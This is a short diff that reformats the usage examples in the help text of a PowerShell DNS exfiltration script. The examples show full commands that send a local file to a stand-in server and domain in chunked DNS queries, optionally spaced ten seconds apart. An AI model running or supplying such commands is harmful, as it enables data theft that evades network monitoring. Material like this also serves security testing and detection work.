@@ -73,13 +73,12 @@ PARAMETERS
     -------------------------- EXAMPLE 1 --------------------------
     PS C:\>.\dnsexfil.ps1 -Server 10.10.80.129 -d fakedomain.com -File C:\Users\Name\file.txt
 
-Use 10.10.80.129 as the fakeDNS-server, and send the file C:\Users\Name\file.txt asking for resolution of
-    [***].fakedomain.com:
+    Use 10.10.80.129 as the fakeDNS-server, and send the file C:\Users\Name\file.txt asking for resolution of [***].fakedomain.com:
 
     -------------------------- EXAMPLE 2 --------------------------
     PS C:\>.\dnsexfil.ps1 -Server 10.10.80.129 -d fakedomain.com -File C:\Users\Name\file.txt -Length 32 -Timeout 10 -Hash
 
-Queries will be like [32-long-chunk].fakedomain.com and going out every 10 seconds:
+    DNS queries will be like [32-long-chunk].fakedomain.com and will be going out every 10 seconds
 
     
 
